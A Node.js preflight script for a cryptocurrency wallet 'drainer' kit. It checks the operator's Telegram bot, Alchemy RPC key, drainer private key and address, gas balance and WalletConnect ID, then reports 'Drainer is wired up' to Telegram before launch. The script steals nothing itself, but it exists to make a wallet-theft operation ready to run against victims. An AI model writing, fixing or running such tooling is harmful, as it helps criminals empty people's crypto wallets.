'use strict';
require('dotenv').config();
const { ethers } = require('ethers');

const problems = [];
const ok  = (m) => console.log('  [ok]   ' + m);
const bad = (m) => { console.log('  [FAIL] ' + m); problems.push(m); };

(async () => {
  console.log('\n=== presence ===');
  for (const k of ['TELEGRAM_BOT_TOKEN','TELEGRAM_CHAT_ID','ALCHEMY_KEY','DRAINER_PRIVATE_KEY','DRAINER_EVM_ADDRESS']) {
    if ((process.env[k] || '').trim()) ok(k + ' set'); else bad(k + ' is EMPTY');
  }

  console.log('\n=== key <-> address ===');
  try {
    const pk = process.env.DRAINER_PRIVATE_KEY.trim();
    const addr = ethers.getAddress(process.env.DRAINER_EVM_ADDRESS.trim());
    const derived = ethers.computeAddress(pk.startsWith('0x') ? pk : '0x' + pk);
    derived === addr ? ok('key matches ' + addr) : bad(`key derives ${derived}, .env says ${addr}`);
  } catch (e) { bad('parse: ' + e.message); }

  console.log('\n=== telegram token ===');
  const token = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
  try {
    const me = await fetch(`https://api.telegram.org/bot${token}/getMe`).then(r => r.json());
    me.ok ? ok('bot @' + me.result.username) : bad('token rejected: ' + (me.description || '?'));
  } catch (e) { bad('token check: ' + e.message); }

  console.log('\n=== alchemy ===');
  const akey = (process.env.ALCHEMY_KEY || '').trim();
  try {
    const r = await fetch(`https://eth-mainnet.g.alchemy.com/v2/${akey}`, {
      method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ id: 1, jsonrpc: '2.0', method: 'eth_blockNumber', params: [] }),
    }).then(r => r.json());
    r.result ? ok('alchemy live, block ' + parseInt(r.result, 16)) : bad('alchemy: ' + JSON.stringify(r.error || r));
  } catch (e) { bad('alchemy: ' + e.message); }

  console.log('\n=== drainer gas ===');
  const addr = (process.env.DRAINER_EVM_ADDRESS || '').trim();
  try {
    const r = await fetch(`https://eth-mainnet.g.alchemy.com/v2/${akey}`, {
      method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ id: 1, jsonrpc: '2.0', method: 'eth_getBalance', params: [addr, 'latest'] }),
    }).then(r => r.json());
    const bal = BigInt(r.result || '0x0');
    bal === 0n ? console.log(`  [warn] 0 ETH on ${addr} - fund it before testing`) : ok(`balance ${ethers.formatEther(bal)} ETH`);
  } catch (e) { bad('balance: ' + e.message); }

  console.log('\n=== walletconnect (optional) ===');
  const wc = (process.env.WALLETCONNECT_PROJECT_ID || '').trim();
  wc.length === 32 ? ok('project id format ok') : console.log(`  [warn] "${wc}" is not 32 chars - only needed for mobile wallets`);

  if (!problems.length && token && process.env.TELEGRAM_CHAT_ID) {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID.trim(), text: '✅ Preflight passed. Drainer is wired up.' }),
    });
    console.log('\n  -> sent a test message to Telegram. Check your phone.');
  }

  console.log('\n' + (problems.length ? `${problems.length} problem(s) above` : 'ALL GOOD -> npm start') + '\n');
})();